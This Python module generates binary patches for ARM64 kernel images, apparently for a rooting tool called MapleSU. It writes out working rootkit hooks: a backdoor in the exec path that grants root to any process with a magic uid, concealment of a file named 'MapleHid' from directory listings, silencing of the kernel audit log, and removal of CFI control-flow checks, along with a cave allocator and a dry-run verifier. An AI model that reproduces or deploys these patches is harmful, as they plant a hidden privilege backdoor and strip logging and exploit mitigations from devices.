"""MapleSU IR rule engine: one definition per hook, applied per kernel release.

`build_ir_spec.py` started with the two rules the 6.6.89 delivery needs (P1
`avc_denied`, P3/P3c `__sys_setresuid`). This module adds the remaining hooks as
first-class rules so a new release is a *generation* run, not a new hand-written
offset table:

  R-execve    privilege gate on `do_execveat_common` (resumes the real function,
              so the `int` 0/-errno return contract is preserved on every release)
  R-filldir   directory hiding on `filldir64`, with the versioned return value
              (`bool 1` on >= 6.1, `int 0` below it - the same split the C++
              engine does with `is_kernel_version_less("6.1.0")`)
  R-audit     audit silencing on `audit_log_start` (NULL = "auditing disabled")
  R-cfi       CFI v1 `__cfi_check` bypass; on 6.x KCFI there is no `__cfi_check`
              to patch, which is reported as `not_applicable`, never as failed

Everything is emitted as equal-length in-place blocks and then put through
`dry_run()`, which re-reads every `orig` from the image, decodes every patched
word, checks that branch targets stay inside the image and inside the +-128 MiB
`b` range, and checks that no block falls through past its own end. A rule that
cannot find its site or its cave returns `failed`; it never guesses.

Cave space comes from `CaveAllocator`, which hands out slices of real zero runs
below `_etext` and refuses an allocation it cannot branch to. This replaces the
single hardcoded 60-byte cave the first generator used: five hooks need ~1-2 KB
and must be allowed to share one run.

Nothing here is device-verified: `dry_run` proves the *encoding and placement*
contract, not that the stub is behaviourally correct on a booted kernel. The
report says so explicitly (`flashableCandidate=false` is unchanged).
"""
from __future__ import annotations

import bisect
import re
from dataclasses import dataclass, field
from typing import Iterable

from capstone import CS_ARCH_ARM64, CS_MODE_ARM, Cs
from capstone.arm64 import ARM64_OP_IMM, ARM64_OP_MEM, ARM64_OP_REG

import a64

MAGIC_UID = 0xDEAD                    # same trigger value the P3c stub uses
MAGIC_NAME = b"MapleHid"              # 8 bytes: filldir hides exactly this name
KCFI_TRAP = 0xD4304440                # `brk #0x8222`
BTI_JC = 0xD50324DF                   # `bti jc`: valid pad for call and jump targets
BRANCH_LIMIT = 1 << 27                # +-128 MiB, the `b`/`bl` reach
DEFAULT_CAVE_SCAN = 4 << 20           # walk at most 4 MiB back from _etext
RETURN_SEMANTICS_VERSION = (6, 1, 0)  # filldir64 switched int -> bool here
RULE_ORDER = ("R-execve", "R-filldir", "R-audit", "R-cfi")   # stable reporting order

_MD = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
_MD.detail = True


class RuleError(RuntimeError):
    pass


# --------------------------------------------------------------------------- #
# Inputs and helpers.
# --------------------------------------------------------------------------- #

class SymbolTable:
    """`name -> offset` plus the spans kallsyms itself implies.

    A symbol's span is the distance to the next recorded address, which is the
    only extent information an image-only toolchain has. It is a bound, not a
    function size: rules use it to bound a search window and never as the answer.
    """

    def __init__(self, symbols: dict):
        self.symbols = dict(symbols)
        self._addresses = sorted(set(self.symbols.values()))

    def __contains__(self, name: str) -> bool:
        return name in self.symbols

    def get(self, name: str, default=None):
        return self.symbols.get(name, default)

    def offset(self, *names: str) -> tuple:
        """First present name -> (name, offset), else (None, 0)."""
        for name in names:
            if name in self.symbols:
                return name, self.symbols[name]
        return None, 0

    def span(self, offset: int) -> int:
        index = bisect.bisect_right(self._addresses, offset)
        while index < len(self._addresses) and self._addresses[index] <= offset:
            index += 1
        return (self._addresses[index] - offset) if index < len(self._addresses) else 0

    def find_first(self, image: bytes, start: int, size: int, word: int) -> list:
        return [off for off in range(start, start + size, 4)
                if int.from_bytes(image[off:off + 4], "little") == word]


def version_tuple(release: str) -> tuple:
    match = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", release or "")
    if not match:
        return (0, 0, 0)
    return tuple(int(part or 0) for part in match.groups())


def read32(image: bytes, offset: int) -> int:
    return int.from_bytes(image[offset:offset + 4], "little")


def decode_one(image: bytes, offset: int) -> tuple:
    insns = list(_MD.disasm(image[offset:offset + 4], offset))
    if len(insns) != 1:
        raise RuleError("0x%x does not decode as one instruction" % offset)
    return insns[0].mnemonic, insns[0].op_str


def branch_target(insn) -> int | None:
    for operand in insn.operands:
        if operand.type == ARM64_OP_IMM:
            return operand.imm
    return None


def is_kcfi_trap(word: int) -> bool:
    return word == KCFI_TRAP


def count_kcfi_traps(image: bytes) -> int:
    """Count 4-byte-aligned `brk #0x8222` sites.

    `bytes.find` over the pattern instead of a per-word Python loop: the images
    are 33-48 MB, and a naive scan costs tens of seconds per release.
    """
    needle = KCFI_TRAP.to_bytes(4, "little")
    count, start = 0, 0
    while True:
        index = image.find(needle, start)
        if index < 0:
            return count
        if index % 4 == 0:
            count += 1
        start = index + 1


# --------------------------------------------------------------------------- #
# Multi-stub cave allocator.
# --------------------------------------------------------------------------- #

@dataclass(order=True)
class CaveSlice:
    offset: int
    size: int
    purpose: str

    @property
    def end(self) -> int:
        return self.offset + self.size


class CaveAllocator:
    """Allocate several stubs out of the zero runs at the tail of .text.

    Allocation contract:

    * candidates are maximal runs of zero bytes below `_etext`, 4-byte aligned,
      at least `min_run` bytes long; scanning starts at `_etext` and walks back
      at most `scan_window` bytes (the same window the first generator used);
    * allocation is first-fit over runs in *descending* address order, so the
      stubs land as deep in .text as possible and stay away from live code;
    * a slice is only handed out when a `b` from the hook site can reach it
      (+-128 MiB) - otherwise the allocator fails instead of emitting a spec
      with an out-of-range branch;
    * slices never overlap: each run keeps a cursor and the allocator records
      every slice it hands out, so `verify()` can re-check the whole layout.
    """

    def __init__(self, image: bytes, table: SymbolTable, min_run: int = 0x40,
                 scan_window: int = DEFAULT_CAVE_SCAN, fill: int = 0):
        self.image = image
        self.table = table
        self.min_run = min_run
        self.scan_window = scan_window
        self.fill = fill
        self.slices: list = []
        self._runs = self._find_runs()

    def _find_runs(self) -> list:
        etext = self.table.get("_etext")
        if etext is None:
            raise RuleError("no _etext symbol: cannot bound the cave search")
        end = min(etext, len(self.image))
        start_limit = max(self.table.get("_stext", 0), end - self.scan_window)
        runs = []
        cursor = end
        while cursor > start_limit:
            if self.image[cursor - 1] != self.fill:
                cursor -= 1
                continue
            run_end = cursor
            while cursor > start_limit and self.image[cursor - 1] == self.fill:
                cursor -= 1
            run_start = (cursor + 3) & ~3
            if run_end - run_start >= self.min_run:
                runs.append((run_start, run_end))
        return runs

    @property
    def runs(self) -> list:
        return list(self._runs)

    def can_branch(self, site: int, target: int) -> bool:
        delta = target - site
        return -BRANCH_LIMIT <= delta < BRANCH_LIMIT

    def reserve(self, offset: int, size: int, purpose: str) -> CaveSlice:
        """Mark an already-placed block (e.g. the legacy P3c stub) as occupied.

        The v1 generator placed its own 60-byte stub in the same zero run this
        allocator scans; without the reservation a new stub would be allocated on
        top of it. Reserved slices take part in overlap checks and in `verify()`.
        """
        piece = CaveSlice(offset, size, purpose)
        if any(other.offset < piece.end and piece.offset < other.end for other in self.slices):
            raise RuleError("reservation %#x+%#x overlaps an existing slice"
                            % (offset, size))
        self.slices.append(piece)
        return piece

    def alloc(self, size: int, site: int, purpose: str) -> CaveSlice:
        if size <= 0 or size % 4:
            raise RuleError("cave request must be a positive multiple of 4")
        for run_start, run_end in self._runs:
            # First fit inside this run: walk the slices already handed out from
            # it in address order and stop at the first gap that fits.
            cursor = run_start
            for taken in sorted(s for s in self.slices if run_start <= s.offset < run_end):
                if cursor + size <= taken.offset:
                    break
                cursor = max(cursor, taken.end)
            cursor = (cursor + 3) & ~3
            if cursor + size > run_end:
                continue
            if not self.can_branch(site, cursor):
                continue
            piece = CaveSlice(cursor, size, purpose)
            self.slices.append(piece)
            return piece
        raise RuleError("no zero cave of %d bytes reachable from 0x%x (%s)"
                        % (size, site, purpose))

    def verify(self) -> list:
        problems = []
        ordered = sorted(self.slices)
        for previous, current in zip(ordered, ordered[1:]):
            if previous.end > current.offset:
                problems.append("cave slices overlap: %#x+%#x > %#x"
                                % (previous.offset, previous.size, current.offset))
        etext = self.table.get("_etext", len(self.image))
        for piece in self.slices:
            if piece.end > etext:
                problems.append("cave slice %#x runs past _etext %#x" % (piece.offset, etext))
            if any(self.image[piece.offset:piece.end]):
                problems.append("cave slice %#x is not all zero" % piece.offset)
        return problems


# --------------------------------------------------------------------------- #
# Rule outcomes.
# --------------------------------------------------------------------------- #

@dataclass
class Block:
    id: str
    offset: int
    orig: bytes
    patched: bytes
    note: str

    def as_dict(self) -> dict:
        return {"id": self.id, "offset": self.offset, "orig": self.orig.hex(),
                "patched": self.patched.hex(), "note": self.note}


@dataclass
class RuleOutcome:
    rule: str
    status: str                    # applied | not_applicable | failed
    detail: str = ""
    blocks: list = field(default_factory=list)
    meta: dict = field(default_factory=dict)

    @property
    def ok(self) -> bool:
        return self.status in ("applied", "not_applicable")

    def as_dict(self) -> dict:
        return {"rule": self.rule, "status": self.status, "detail": self.detail,
                "meta": self.meta,
                "blocks": [block.id for block in self.blocks]}


class RuleContext:
    def __init__(self, image: bytes, table: SymbolTable, release: str,
                 struct_offsets: dict | None, allocator: CaveAllocator):
        self.image = image
        self.table = table
        self.release = release
        self.version = version_tuple(release)
        self.struct = dict(struct_offsets or {})
        self.caves = allocator

    # -- shared machine ---------------------------------------------------- #

    def block(self, block_id: str, offset: int, patched: bytes, note: str) -> Block:
        orig = self.image[offset:offset + len(patched)]
        if len(orig) != len(patched):
            raise RuleError("block %s runs past the end of the image" % block_id)
        return Block(block_id, offset, orig, patched, note)

    def entry_hook(self, name: str) -> tuple:
        """(hook site, word to replay, resume address) for a function entry.

        A `bti c` is left in place (it is the indirect-branch landing pad the CFI
        hardware expects) and the branch is placed after it; the stub replays the
        single instruction it overwrote, then continues at site+4.
        """
        symbol, offset = self.table.offset(name)
        if not offset:
            raise RuleError("symbol %s is missing" % name)
        mnemonic, operands = decode_one(self.image, offset)
        if mnemonic == "bti":
            offset += 4
            mnemonic, operands = decode_one(self.image, offset)
        return offset, read32(self.image, offset), offset + 4

    def write_stub(self, purpose: str, site: int, size: int) -> CaveSlice:
        """Reserve cave space only; the caller encodes once it knows the base."""
        return self.caves.alloc(size, site, purpose)

    # -- rules ------------------------------------------------------------- #

    def rule_execve(self) -> RuleOutcome:
        """R-execve: uid-gated privilege escalation on the exec entry."""
        symbol, offset = self.table.offset("do_execveat_common", "__do_execve_file",
                                           "do_execve_common", "do_execve")
        if not offset:
            return RuleOutcome("R-execve", "failed", "no exec entry symbol in this image")
        cred = self.struct.get("cred")
        uid = self.struct.get("cred_uid")
        if not cred or uid is None:
            return RuleOutcome("R-execve", "failed",
                               "task_struct offsets unresolved (cred/cred_uid); "
                               "run tools/ir-gen/resolve_struct_offsets.py first")
        init_task = self.table.get("init_task")
        prepare = self.table.get("prepare_kernel_cred")
        commit = self.table.get("commit_creds")
        if not (init_task and prepare and commit):
            return RuleOutcome("R-execve", "failed",
                               "init_task/prepare_kernel_cred/commit_creds missing")
        site, replay, resume = self.entry_hook(symbol)

        # 13 words / 52 bytes. `.Lorig` is the replay word at +44, so every
        # "not ours" branch lands there and the function continues untouched.
        cave = self.write_stub("R-execve.stub", site, 13 * 4)
        base = cave.offset
        words = [
            a64.mrs_sp_el0(9),                                  # +0  current
            a64.ldr_imm(9, 9, cred),                            # +4  current->cred
            a64.ldr_imm(10, 9, uid, width=4),                   # +8  cred->uid
            a64.movz(11, MAGIC_UID),                            # +12 magic uid
            a64.cmp_reg(10, 11),                                # +16
            a64.b_cond(base + 20, base + 44, a64.COND_NE),      # +20 not ours -> original
            a64.adrp(0, base + 24, init_task),                  # +24 &init_task
            a64.add_imm(0, 0, init_task & 0xFFF),               # +28
            a64.bl(base + 32, prepare),                         # +32 prepare_kernel_cred
            a64.cbz_x(0, base + 36, base + 44),                 # +36 failed -> original
            a64.bl(base + 40, commit),                          # +40 commit_creds(new)
            replay,                                             # +44 .Lorig
            a64.b(base + 48, resume),                           # +48 resume the function
        ]
        blob = b"".join(word.to_bytes(4, "little") for word in words)
        if len(blob) != cave.size:
            raise RuleError("R-execve stub size mismatch")
        return RuleOutcome(
            "R-execve", "applied",
            "%s entry hooked, uid gate + commit_creds(prepare_kernel_cred(&init_task)) in the cave"
            % symbol,
            [self.block("R-execve.entry", site, a64.b(site, base).to_bytes(4, "little"),
                        "%s: entry -> R-execve stub (replays the overwritten word)" % symbol),
             self.block("R-execve.stub", base, blob,
                        "cave stub: magic-uid gate, then resume %s+4" % symbol)],
            {"symbol": symbol, "site": site, "cave": base, "stubBytes": len(blob),
             "cred_offset": cred, "cred_uid_offset": uid,
             "abi": "int (0/-errno) preserved: the stub always resumes the real function"})

    def rule_filldir(self) -> RuleOutcome:
        """R-filldir: hide MAGIC_NAME from directory listings, versioned return."""
        symbol, offset = self.table.offset("filldir64")
        if not offset:
            return RuleOutcome("R-filldir", "failed", "filldir64 missing")
        site, replay, resume = self.entry_hook(symbol)
        modern = self.version >= RETURN_SEMANTICS_VERSION
        skip_value = 1 if modern else 0
        magic = int.from_bytes(MAGIC_NAME, "little")

        # 13 words / 52 bytes: namlen gate, 8-byte name compare, versioned skip
        # value, then the replay of the overwritten word and a branch back.
        cave = self.write_stub("R-filldir.stub", site, 13 * 4)
        base = cave.offset
        words = [
            a64.cmp_imm(2, len(MAGIC_NAME)),                    # +0  namlen == 8
            a64.b_cond(base + 4, base + 44, a64.COND_NE),       # +4
            a64.ldr_imm(9, 1, 0),                               # +8  name[0:8]
        ]
        words += a64.mov_imm64(10, magic)                       # +12..+24
        words += [
            a64.cmp_reg(9, 10),                                 # +28
            a64.b_cond(base + 32, base + 44, a64.COND_NE),      # +32
            a64.movz(0, skip_value),                            # +36 hidden -> skip
            a64.ret(),                                          # +40
            replay,                                             # +44 not ours -> original
            a64.b(base + 48, resume),                           # +48
        ]
        blob = b"".join(word.to_bytes(4, "little") for word in words)
        if len(blob) != cave.size:
            raise RuleError("R-filldir stub size mismatch")
        return RuleOutcome(
            "R-filldir", "applied",
            "filldir64 %s: name gate on %r, skip value %d (%s return)"
            % ("%d.%d.%d" % self.version, MAGIC_NAME, skip_value,
               "bool" if modern else "int"),
            [self.block("R-filldir.entry", site, a64.b(site, base).to_bytes(4, "little"),
                        "filldir64: entry -> R-filldir stub (replays the overwritten word)"),
             self.block("R-filldir.stub", base, blob,
                        "cave stub: 8-byte name gate -> return %d, else resume filldir64+4"
                        % skip_value)],
            {"symbol": symbol, "site": site, "cave": base, "stubBytes": len(blob),
             "hiddenName": MAGIC_NAME.decode("latin1"),
             "abi": "bool 1" if modern else "int 0",
             "abiVersionGate": ">=6.1.0" if modern else "<6.1.0"})

    def rule_audit(self) -> RuleOutcome:
        """R-audit: silence audit_log_start by returning NULL."""
        symbol, offset = self.table.offset("audit_log_start")
        if not offset:
            return RuleOutcome("R-audit", "failed", "audit_log_start missing")
        # A `bti c` landing pad is left in place; the branch goes right after it,
        # which keeps indirect callers valid and still skips the whole prologue.
        site, _replay, _resume = self.entry_hook(symbol)
        cave = self.write_stub("R-audit.stub", site, 8)
        words = [a64.mov_wzr(0), a64.ret()]
        blob = b"".join(word.to_bytes(4, "little") for word in words)
        return RuleOutcome(
            "R-audit", "applied",
            "audit_log_start returns NULL (callers treat NULL as auditing disabled)",
            [self.block("R-audit.entry", site, a64.b(site, cave.offset).to_bytes(4, "little"),
                        "audit_log_start: entry -> R-audit stub"),
             self.block("R-audit.stub", cave.offset, blob, "cave stub: x0 = NULL; ret")],
            {"symbol": symbol, "site": site, "cave": cave.offset, "stubBytes": len(blob)})

    def rule_cfi(self) -> RuleOutcome:
        """R-cfi: CFI v1 `__cfi_check` -> ret; KCFI is explicitly not applicable.

        The entry keeps its indirect-branch landing pad: when the first word is
        `bti *` it is left in place and the second word becomes `ret`; when it is
        `paciasp`/`pacibsp` it is replaced by `bti jc`, exactly what the C++ engine
        emits (`patch_ret_cmd`). Overwriting the pad with a bare `ret` would make
        every *indirect* caller fault on a BTI-enabled kernel.
        """
        check = self.table.get("__cfi_check")
        traps = count_kcfi_traps(self.image)
        if not check:
            return RuleOutcome(
                "R-cfi", "not_applicable",
                "KCFI image (no __cfi_check symbol); %d `brk #0x8222` trap sites live in the "
                "callees, so a hot patch that keeps every call target intact needs no CFI hook"
                % traps,
                meta={"variant": "kcfi", "kcfiTraps": traps})
        blocks = []
        for name in ("__cfi_check", "__cfi_check_fail", "__cfi_slowpath", "__cfi_slowpath_diag"):
            offset = self.table.get(name)
            if not offset:
                continue
            mnemonic, _operands = decode_one(self.image, offset)
            if mnemonic == "bti":
                patched = self.image[offset:offset + 4] + a64.ret().to_bytes(4, "little")
                note = "%s: keeps the %s pad, next word -> ret (CFI v1 bypass)" % (name, mnemonic)
            elif mnemonic in ("paciasp", "pacibsp"):
                patched = BTI_JC.to_bytes(4, "little") + a64.ret().to_bytes(4, "little")
                note = "%s: %s pad -> bti jc; ret (CFI v1 bypass)" % (name, mnemonic)
            else:
                patched = a64.ret().to_bytes(4, "little")
                note = "%s: ret (CFI v1 bypass)" % name
            blocks.append(self.block("R-cfi.%s" % name.lstrip("_"), offset, patched, note))
        return RuleOutcome("R-cfi", "applied",
                           "CFI v1: %d check entry point(s) neutralised, landing pads preserved"
                           % len(blocks),
                           blocks, {"variant": "cfi-v1", "kcfiTraps": traps})

    # -- driver ------------------------------------------------------------ #

    def apply(self, rules: Iterable[str] | None = None) -> list:
        wanted = list(rules or ("R-execve", "R-filldir", "R-audit", "R-cfi"))
        handlers = {"R-execve": self.rule_execve, "R-filldir": self.rule_filldir,
                    "R-audit": self.rule_audit, "R-cfi": self.rule_cfi}
        outcomes = []
        for rule in wanted:
            if rule not in handlers:
                raise RuleError("unknown rule %s" % rule)
            try:
                outcomes.append(handlers[rule]())
            except RuleError as error:
                outcomes.append(RuleOutcome(rule, "failed", str(error)))
        return outcomes


# --------------------------------------------------------------------------- #
# Dry-run verification.
# --------------------------------------------------------------------------- #

def is_direct_branch(mnemonic: str) -> bool:
    """True for `b`, `b.cond`, `bl`, `cbz`, `cbnz`, `tbz`, `tbnz`.

    Not `str.startswith("b")`: that also matches `bti`, `brk` and `br`, which
    either carry no target (`bti`) or are not position-independent (`br`).
    """
    return mnemonic in ("b", "bl", "cbz", "cbnz", "tbz", "tbnz") or mnemonic.startswith("b.")


def dry_run(image: bytes, blocks: list, entry_blocks: Iterable[str] = ()) -> dict:
    """Prove the block set is self-consistent against the image bytes.

    Checks, in order:
      1. readback: every `orig` equals the image at that offset;
      2. every patched word decodes as exactly one instruction;
      3. no two blocks overlap;
      4. every block lies inside the image;
      5. every direct branch target is inside the image and within +-128 MiB of
         its site (a `b` that cannot reach is a plan that cannot apply);
      6. every block ends in a terminal instruction (`ret`/`b`), so a stub can
         never fall through into whatever follows it;
      7. each named entry block is a single `b` to a cave block in this set.
    """
    problems = []
    entry_blocks = set(entry_blocks)
    cave_offsets = {block.offset: block.id for block in blocks}
    ordered = sorted(blocks, key=lambda block: block.offset)
    for previous, current in zip(ordered, ordered[1:]):
        if previous.offset + len(previous.orig) > current.offset:
            problems.append("blocks overlap: %s / %s" % (previous.id, current.id))

    for block in blocks:
        if block.offset < 0 or block.offset + len(block.orig) > len(image):
            problems.append("%s outside the image" % block.id)
            continue
        if image[block.offset:block.offset + len(block.orig)] != block.orig:
            problems.append("%s orig does not read back from the image" % block.id)
        if len(block.patched) != len(block.orig):
            problems.append("%s is not an equal-length patch" % block.id)
            continue
        words = [int.from_bytes(block.patched[i:i + 4], "little")
                 for i in range(0, len(block.patched), 4)]
        if len(block.patched) % 4:
            problems.append("%s is not instruction aligned" % block.id)
        insns = list(_MD.disasm(block.patched, block.offset))
        if len(insns) != len(words):
            problems.append("%s does not decode cleanly" % block.id)
            continue
        for insn in insns:
            if is_direct_branch(insn.mnemonic):
                target = branch_target(insn)
                if target is None:
                    problems.append("%s: %s has no target" % (block.id, insn.mnemonic))
                elif not 0 <= target < len(image):
                    problems.append("%s: branch target %#x outside the image"
                                    % (block.id, target))
                elif abs(target - insn.address) >= BRANCH_LIMIT:
                    problems.append("%s: branch to %#x out of the +-128 MiB range"
                                    % (block.id, target))
        last = insns[-1]
        # A multi-instruction block owns the flow: it has to end in a terminal, or
        # it would run into whatever follows it in the image. A single-word
        # replacement (P1's `mov w0, #0`, an entry hook's `b`) intentionally
        # continues in the surrounding code, so it is exempt.
        if len(insns) > 1 and not (last.mnemonic.startswith("ret") or last.mnemonic == "b"):
            problems.append("%s does not end in ret/b (%s)" % (block.id, last.mnemonic))
        if block.id in entry_blocks:
            if len(insns) != 1 or insns[0].mnemonic != "b":
                problems.append("%s is not a single `b` entry hook" % block.id)
            elif branch_target(insns[0]) not in cave_offsets:
                problems.append("%s does not point at a cave block" % block.id)
    return {"ok": not problems, "problems": problems, "blocks": len(blocks)}


def render_meta(outcomes: list, struct_offsets: dict | None, release: str,
                allocator: CaveAllocator) -> list:
    """`#struct.*` / `#abi.*` / `#rule.*` lines for the extended spec.

    These exist so the IR module never hardcodes a kernel version: the struct
    offsets and the ABI choice arrive as data. Unknown `#key=value` lines are
    ignored by maplesu_ir.c, so the extended spec still loads on the old module.
    """
    lines = []
    struct = struct_offsets or {}
    if struct:
        lines.append("#struct.cred=0x%x" % struct["cred"])
        lines.append("#struct.cred_uid=%d" % struct["cred_uid"])
        lines.append("#struct.seccomp=0x%x" % struct["seccomp"])
    filldir = next((o for o in outcomes if o.rule == "R-filldir"), None)
    lines.append("#abi.filldir_return=%s" % (filldir.meta.get("abi", "unknown")
                                             if filldir else "unknown"))
    lines.append("#abi.execve_return=int32_preserved")
    lines.append("#abi.release=%d.%d.%d" % version_tuple(release))
    for outcome in outcomes:
        lines.append("#rule.%s=%s" % (outcome.rule, outcome.status))
        if outcome.status == "applied" and outcome.meta.get("cave") is not None:
            lines.append("#rule.%s.cave=0x%x" % (outcome.rule, outcome.meta["cave"]))
    for piece in sorted(allocator.slices):
        lines.append("#cave.%s=0x%x+0x%x" % (piece.purpose, piece.offset, piece.size))
    return lines
